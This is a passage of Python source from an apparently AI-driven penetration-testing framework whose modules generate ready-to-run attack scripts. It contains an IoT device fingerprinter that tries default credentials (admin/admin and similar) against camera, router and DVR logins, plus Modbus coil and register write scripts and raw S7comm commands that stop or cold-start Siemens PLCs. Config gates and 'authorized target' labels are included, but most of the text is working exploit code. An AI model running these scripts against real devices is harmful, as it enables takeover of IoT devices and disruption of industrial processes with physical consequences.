            elif ":443" in first:
                port = 443
        else:
            scheme = "http"
            if ":8080" in first:
                port = 8080
            elif ":80" in first:
                port = 80
    creds = try_login(scheme, port, fp["login_path"])
    out = {{
        "target": TARGET,
        "vendor": fp["vendor"],
        "login_path": fp["login_path"],
        "evidence": fp["evidence"],
        "default_cred_hits": creds,
        "note": "READ-ONLY cred CHECK against owned target; default-cred list only.",
    }}
    print(json.dumps(out, indent=2))


if __name__ == "__main__":
    main()
'''


class IoTDefaultCred(AttackModule):
    name = "IoTDefaultCred"
    description = (
        "Fingerprint IoT device web UIs (cameras/routers/DVRs, ONVIF, HNAP, TR-069/CWMP) "
        "and check small default-cred list. Authorized cred-check against the owned "
        "target (Mirai-class default-cred problem), not credential_theft."
    )
    target_services = ["http", "https", "telnet", "mqtt"]
    target_ports = [23, 80, 443, 1883, 8883, 7547, 8000, 8080]
    required_cves: list[str] = []

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        script = self.generate_python_script(ctx)
        return {
            "status": "script_generated",
            "module": self.name,
            "script": script,
            "note": (
                "Fingerprints IoT device web UIs (camera/router/DVR labels: /cgi-bin/, "
                "/onvif/, /doc/page/login.asp, /login.gch, /HNAP1) and checks a small "
                "default-cred list (admin/admin, admin/password, root/admin, admin/12345, "
                "admin/<blank>) -- the well-known IoT default-cred problem -- against the "
                "owned target only. Notes TR-069/CWMP on 7547 if open. READ-ONLY cred check."
            ),
            "evidence": [f"IoT default-cred check queued against {ctx.target_ip}"],
            "references": [
                "Mirai-class IoT default credentials (public threat reporting)",
                "TR-069 / CWMP (Broadband Forum TR-069) on TCP/UDP 7547",
            ],
        }

    def generate_python_script(self, ctx: ModuleContext) -> str:
        return f'''#!/usr/bin/env python3
"""IoT device fingerprint + default-cred CHECK -- READ-ONLY cred check.

Connects only to the single authorized target. Fingerprints IoT device web UIs
(camera / router / DVR labels) and checks a SMALL default-credential list
against the detected login page. This is an authorized default-cred CHECK
against an owned target (the Mirai-class IoT default-cred problem), not
credential_theft and not a broad brute force. Also notes whether TR-069/CWMP
is open on 7547. No writes to device state; web login form only.
"""
import json
import socket
import sys
import urllib.request
import urllib.error
import urllib.parse
import base64

TARGET = sys.argv[1] if len(sys.argv) > 1 else "{ctx.target_ip}"
TIMEOUT = 5.0
# IoT web fingerprint paths (camera/router/DVR labels)
FINGERPRINT_PATHS = [
    "/", "/login.html", "/cgi-bin/", "/onvif/", "/doc/page/login.asp",
    "/login.gch", "/HNAP1", "/index.html", "/admin", "/cgi-bin/hi3510/",
]
# Device-type signatures (case-insensitive substring)
SIGNATURES = {{
    "ip_camera": ["onvif", "ip camera", "webcam", "hi3510", "dvr"],
    "router": ["hnap", "login.gch", "router", "firmware"],
    "dvr": ["dvr", "nvr", "video", "cgi-bin/hi3510"],
}}
# Small IoT default-cred list (authorized check against owned target only)
CREDS = [
    ("admin", "admin"),
    ("admin", "password"),
    ("root", "admin"),
    ("admin", "12345"),
    ("admin", ""),
]


def probe(scheme: str, port: int, path: str) -> tuple[int, str, dict[str, str]]:
    url = f"{{scheme}}://{{TARGET}}:{{port}}{{path}}"
    try:
        req = urllib.request.Request(url, headers={{"User-Agent": "NetAttackAi-IoT-Enum/1.0"}})
        with urllib.request.urlopen(req, timeout=TIMEOUT) as resp:
            body = resp.read(8192).decode(errors="replace")
            return resp.status, body, dict(resp.headers)
    except urllib.error.HTTPError as e:
        try:
            body = e.read(8192).decode(errors="replace")
        except Exception:
            body = ""
        return e.code, body, dict(e.headers) if e.headers else {{}}
    except Exception:
        return 0, "", {{}}


def check_tr069() -> bool:
    """Note whether TR-069/CWMP port 7547 is open (read-only TCP connect probe)."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(2.0)
            s.connect((TARGET, 7547))
            return True
    except Exception:
        return False


def fingerprint() -> dict:
    fp = {{"device_type": "unknown", "login_path": "/login.html", "evidence": []}}
    for scheme, port in (("http", 80), ("https", 443), ("http", 8080), ("http", 8000), ("https", 8443)):
        for path in FINGERPRINT_PATHS:
            status, body, headers = probe(scheme, port, path)
            blob = (body + " " + " ".join(f"{{k}}:{{v}}" for k, v in headers.items())).lower()
            for dtype, sigs in SIGNATURES.items():
                for sig in sigs:
                    if sig.lower() in blob and status:
                        fp["device_type"] = dtype
                        fp["login_path"] = path if path not in ("/",) else "/login.html"
                        fp["evidence"].append(f"{{scheme}}://{{TARGET}}:{{port}}{{path}} -> {{status}} matched '{{sig}}'")
                        return fp
    return fp


def try_login(scheme: str, port: int, login_path: str) -> list[dict]:
    """Check the small IoT default-cred list against the detected login endpoint."""
    hits = []
    for u, p in CREDS:
        url = f"{{scheme}}://{{TARGET}}:{{port}}{{login_path}}"
        # HTTP Basic first (many IoT cams use it)
        try:
            req = urllib.request.Request(url, headers={{
                "User-Agent": "NetAttackAi-IoT-Enum/1.0",
                "Authorization": "Basic " + base64.b64encode(f"{{u}}:{{p}}".encode()).decode(),
            }})
            with urllib.request.urlopen(req, timeout=TIMEOUT) as resp:
                if resp.status < 400:
                    hits.append({{"user": u, "password": p, "auth": "basic", "status": resp.status}})
                    return hits
        except urllib.error.HTTPError as e:
            if e.code == 401:
                continue
        except Exception:
            pass
        # Form POST
        try:
            data = urllib.parse.urlencode({{"username": u, "password": p, "user": u, "pass": p}}).encode()
            req = urllib.request.Request(url, data=data, method="POST", headers={{
                "User-Agent": "NetAttackAi-IoT-Enum/1.0",
                "Content-Type": "application/x-www-form-urlencoded",
            }})
            with urllib.request.urlopen(req, timeout=TIMEOUT) as resp:
                if resp.status < 400:
                    hits.append({{"user": u, "password": p, "auth": "form", "status": resp.status}})
                    return hits
        except urllib.error.HTTPError:
            continue
        except Exception:
            pass
    return hits


def main() -> None:
    fp = fingerprint()
    scheme, port = "http", 80
    if fp["evidence"]:
        first = fp["evidence"][0]
        if "https://" in first:
            scheme = "https"
            port = 8443 if ":8443" in first else 443
        else:
            scheme = "http"
            port = 8080 if ":8080" in first else (8000 if ":8000" in first else 80)
    tr069_open = check_tr069()
    creds = try_login(scheme, port, fp["login_path"])
    out = {{
        "target": TARGET,
        "device_type": fp["device_type"],
        "login_path": fp["login_path"],
        "evidence": fp["evidence"],
        "tr069_cwmp_7547_open": tr069_open,
        "default_cred_hits": creds,
        "note": "READ-ONLY cred CHECK against owned target; IoT default-cred list only.",
    }}
    print(json.dumps(out, indent=2))


if __name__ == "__main__":
    main()
'''


# ===========================================================================
# Phase 6.3 — WRITE-SIDE ICS modules (destructive risk; dual-gated).
#
# These modules change physical process state (coil/register writes, PLC
# stop/start). They are behind TWO gates:
#   1. @require_allowlist() on run_attack_module (target must be in allowlist)
#   2. ics.allow_write: true in config.yaml (default FALSE) — _ics_write_allowed()
# A write-side module's run() refuses (blocked) unless BOTH gates pass.
# Read-only enum above works without ics.allow_write.
# ===========================================================================


_WRITE_BLOCKED_NOTE = (
    "BLOCKED: write-side ICS requires ics.allow_write: true in config.yaml "
    "(default false — physical-damage risk). The target-IP allowlist gate is "
    "enforced at the MCP tool layer; this is the second gate."
)


class ModbusWriteCoil(AttackModule):
    """Write a single Modbus/TCP coil (FC 05) — DESTRUCTIVE.

    Changes physical process state. Dual-gated: ``@require_allowlist()`` on
    ``run_attack_module`` (target in allowlist) AND ``ics.allow_write: true``
    in config. Refuses with a blocked status when the write flag is false.
    """

    name = "ModbusWriteCoil"
    description = (
        "Write a single Modbus/TCP coil (function code 05) to a target unit. "
        "DESTRUCTIVE: changes physical process state. Requires ics.allow_write: true."
    )
    target_services = ["modbus", "tcp"]
    target_ports = [502]
    required_cves: list[str] = []
    # Phase 1: hard-gate applicability at 0 unless both ics.allow_write +
    # ics.destructive_ics are armed in config. Defense in depth with the
    # run() _ics_write_allowed() re-check.
    destructive_ics = True

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        if not _ics_write_allowed():
            return {
                "status": "blocked",
                "module": self.name,
                "target_ip": ctx.target_ip,
                "note": _WRITE_BLOCKED_NOTE,
            }
        return {
            "status": "script_generated",
            "module": self.name,
            "script": self.generate_python_script(ctx),
            "note": (
                "DESTRUCTIVE Modbus/TCP coil write (FC 05). Requires "
                "ics.allow_write: true + target in allowlist. Connects only "
                "to the single authorized target."
            ),
            "references": [
                "modbus.org MODBUS Messaging on TCP/IP Implementation Guide v1.0b",
                "MBFuncCode 05 Write Single Coil (destructive)",
            ],
        }

    def generate_python_script(self, ctx: ModuleContext) -> str:
        return f'''#!/usr/bin/env python3
"""Modbus/TCP coil write (FC 05) -- DESTRUCTIVE / write-side.

Requires ics.allow_write: true (enforced by the caller) + target in allowlist
(enforced by @require_allowlist on run_attack_module). Connects only to the
single authorized target. Write function code 05 (Write Single Coil) is used.
"""
import json
import socket
import struct
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "{ctx.target_ip}"
PORT = 502
TIMEOUT = 3.0
FC_WRITE_COIL = 5  # 0x05 -- Write Single Coil (destructive)
tx_counter = 0


def build_adu(unit_id: int, pdu: bytes) -> bytes:
    global tx_counter
    tx_counter += 1
    length = len(pdu) + 1
    mbap = struct.pack(">HHHB", tx_counter, 0x0000, length, unit_id)
    return mbap + pdu


def write_coil(unit_id: int, address: int, value: bool) -> bytes:
    """PDU for FC 05 Write Single Coil. value=True -> 0xFF00, False -> 0x0000."""
    return struct.pack(">BHH", FC_WRITE_COIL, address, 0xFF00 if value else 0x0000)


def query(unit_id: int, pdu: bytes) -> bytes | None:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(TIMEOUT)
            s.connect((TARGET, PORT))
            s.send(build_adu(unit_id, pdu))
            hdr = s.recv(7)
            if len(hdr) < 7:
                return None
            _txn, _proto, length, _uid = struct.unpack(">HHHB", hdr)
            rest = s.recv(length - 1) if length > 1 else b""
            return hdr[6:7] + rest
    except Exception:
        return None


def main() -> None:
    # ponytail: single coil write at address 0, unit 1. The operator edits
    # address/value/unit for their authorized PLC test.
    resp = query(1, write_coil(1, 0, True))
    print(json.dumps({{"target": TARGET, "port": PORT, "wrote": resp is not None}}))


if __name__ == "__main__":
    main()
'''


class ModbusWriteRegister(AttackModule):
    """Write a single Modbus/TCP holding register (FC 06) — DESTRUCTIVE.

    Changes physical process state. Dual-gated like ``ModbusWriteCoil``.
    """

    name = "ModbusWriteRegister"
    description = (
        "Write a single Modbus/TCP holding register (function code 06) to a target "
        "unit. DESTRUCTIVE: changes process state. Requires ics.allow_write: true."
    )
    target_services = ["modbus", "tcp"]
    target_ports = [502]
    required_cves: list[str] = []
    destructive_ics = True

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        if not _ics_write_allowed():
            return {
                "status": "blocked",
                "module": self.name,
                "target_ip": ctx.target_ip,
                "note": _WRITE_BLOCKED_NOTE,
            }
        return {
            "status": "script_generated",
            "module": self.name,
            "script": self.generate_python_script(ctx),
            "note": (
                "DESTRUCTIVE Modbus/TCP holding-register write (FC 06). Requires "
                "ics.allow_write: true + target in allowlist."
            ),
            "references": [
                "MBFuncCode 06 Write Single Register (destructive)",
            ],
        }

    def generate_python_script(self, ctx: ModuleContext) -> str:
        return f'''#!/usr/bin/env python3
"""Modbus/TCP holding-register write (FC 06) -- DESTRUCTIVE / write-side.

Requires ics.allow_write: true + target in allowlist. Connects only to the
single authorized target.
"""
import json
import socket
import struct
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "{ctx.target_ip}"
PORT = 502
TIMEOUT = 3.0
FC_WRITE_REGISTER = 6  # 0x06 -- Write Single Register (destructive)
tx_counter = 0


def build_adu(unit_id: int, pdu: bytes) -> bytes:
    global tx_counter
    tx_counter += 1
    length = len(pdu) + 1
    mbap = struct.pack(">HHHB", tx_counter, 0x0000, length, unit_id)
    return mbap + pdu


def write_register(unit_id: int, address: int, value: int) -> bytes:
    return struct.pack(">BHH", FC_WRITE_REGISTER, address, value & 0xFFFF)


def query(unit_id: int, pdu: bytes) -> bytes | None:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(TIMEOUT)
            s.connect((TARGET, PORT))
            s.send(build_adu(unit_id, pdu))
            hdr = s.recv(7)
            if len(hdr) < 7:
                return None
            _txn, _proto, length, _uid = struct.unpack(">HHHB", hdr)
            rest = s.recv(length - 1) if length > 1 else b""
            return hdr[6:7] + rest
    except Exception:
        return None


def main() -> None:
    resp = query(1, write_register(1, 0, 1))
    print(json.dumps({{"target": TARGET, "port": PORT, "wrote": resp is not None}}))


if __name__ == "__main__":
    main()
'''


class S7PlcStop(AttackModule):
    """Stop a Siemens S7 PLC — DESTRUCTIVE (halts the controlled process).

    Dual-gated: ``@require_allowlist()`` + ``ics.allow_write: true``.
    """

    name = "S7PlcStop"
    description = (
        "Stop a Siemens S7 PLC via S7comm PLC stop. DESTRUCTIVE: halts the "
        "controlled physical process. Requires ics.allow_write: true."
    )
    target_services = ["iso-tsap", "s7", "s7comm"]
    target_ports = [102]
    required_cves: list[str] = []
    destructive_ics = True

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        if not _ics_write_allowed():
            return {
                "status": "blocked",
                "module": self.name,
                "target_ip": ctx.target_ip,
                "note": _WRITE_BLOCKED_NOTE,
            }
        return {
            "status": "script_generated",
            "module": self.name,
            "script": self.generate_python_script(ctx),
            "note": (
                "DESTRUCTIVE S7 PLC stop. Halts the controlled process. Requires "
                "ics.allow_write: true + target in allowlist."
            ),
            "references": [
                "Siemens S7comm PLC stop (destructive control command)",
            ],
        }

    def generate_python_script(self, ctx: ModuleContext) -> str:
        return f'''#!/usr/bin/env python3
"""Siemens S7 PLC stop -- DESTRUCTIVE / write-side.

Requires ics.allow_write: true + target in allowlist. Sends an S7comm PLC
stop command after the COTP/TPKT handshake. Connects only to the single
authorized target.
"""
import json
import socket
import struct
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "{ctx.target_ip}"
PORT = 102
TIMEOUT = 5.0


def tpkt(payload: bytes) -> bytes:
    return struct.pack(">BBH", 3, 0, len(payload) + 4) + payload


def cotp_cr() -> bytes:
    li = 0x11
    code = 0xE0
    var = bytes([0xC0, 0x01, 0x0A, 0xC2, 0x02, 0x01, 0x00, 0xC2, 0x02, 0x02, 0x00])
    return bytes([li, code]) + struct.pack(">HH", 0x0001, 0x0001) + bytes([0x00]) + var


def s7_plc_stop() -> bytes:
    """S7comm PLC stop job (destructive)."""
    cotp_dt = bytes([0x02, 0xF0, 0x80])
    # S7 header: prot id 0x32 + ROSCTR 0x01 (job) + redid + pogid + datalen
    # param: function 0x05 (PLC stop) — destructive control command
    param = bytes([0x05, 0x01, 0x00, 0x00, 0x00, 0x00])
    s7_hdr = struct.pack(">BBHHH", 0x32, 0x01, 0x0000, 0x0000, len(param))
    return cotp_dt + s7_hdr + param


def main() -> None:
    out = {{"target": TARGET, "port": PORT, "stopped": False}}
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(TIMEOUT)
            s.connect((TARGET, PORT))
            s.send(tpkt(cotp_cr()))
            s.recv(4096)
            s.send(tpkt(s7_plc_stop()))
            out["stopped"] = True
    except Exception as e:
        out["error"] = str(e)
    print(json.dumps(out, indent=2))


if __name__ == "__main__":
    main()
'''


class S7PlcStart(AttackModule):
    """Start a Siemens S7 PLC — write-side control command.

    Dual-gated like the other write-side modules. Less destructive than stop
    but still a control command that changes process state.
    """

    name = "S7PlcStart"
    description = (
        "Start a Siemens S7 PLC via S7comm PLC start/cold start. Write-side "
        "control command. Requires ics.allow_write: true."
    )
    target_services = ["iso-tsap", "s7", "s7comm"]
    target_ports = [102]
    required_cves: list[str] = []
    destructive_ics = True

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        if not _ics_write_allowed():
            return {
                "status": "blocked",
                "module": self.name,
                "target_ip": ctx.target_ip,
                "note": _WRITE_BLOCKED_NOTE,
            }
        return {
            "status": "script_generated",
            "module": self.name,
            "script": self.generate_python_script(ctx),
            "note": (
                "Write-side S7 PLC start (cold start). Changes process state. "
                "Requires ics.allow_write: true + target in allowlist."
            ),
            "references": [
                "Siemens S7comm PLC start / cold start (control command)",
            ],
        }

    def generate_python_script(self, ctx: ModuleContext) -> str:
        return f'''#!/usr/bin/env python3
"""Siemens S7 PLC start -- write-side control command.

Requires ics.allow_write: true + target in allowlist. Sends an S7comm PLC
cold-start command after the COTP/TPKT handshake. Connects only to the
single authorized target.
"""
import json
import socket
import struct
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "{ctx.target_ip}"
PORT = 102
TIMEOUT = 5.0


def tpkt(payload: bytes) -> bytes:
    return struct.pack(">BBH", 3, 0, len(payload) + 4) + payload


def cotp_cr() -> bytes:
    li = 0x11
    code = 0xE0
    var = bytes([0xC0, 0x01, 0x0A, 0xC2, 0x02, 0x01, 0x00, 0xC2, 0x02, 0x02, 0x00])
    return bytes([li, code]) + struct.pack(">HH", 0x0001, 0x0001) + bytes([0x00]) + var


def s7_plc_start() -> bytes:
    """S7comm PLC cold-start job (write-side control command)."""
    cotp_dt = bytes([0x02, 0xF0, 0x80])
    # function 0x06 = PLC start / cold start
    param = bytes([0x06, 0x01, 0x00, 0x00, 0x00, 0x00])
    s7_hdr = struct.pack(">BBHHH", 0x32, 0x01, 0x0000, 0x0000, len(param))
    return cotp_dt + s7_hdr + param


def main() -> None:
    out = {{"target": TARGET, "port": PORT, "started": False}}
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(TIMEOUT)
            s.connect((TARGET, PORT))
            s.send(tpkt(cotp_cr()))
            s.recv(4096)
            s.send(tpkt(s7_plc_start()))
            out["started"] = True
    except Exception as e:
        out["error"] = str(e)
    print(json.dumps(out, indent=2))


if __name__ == "__main__":
    main()
'''
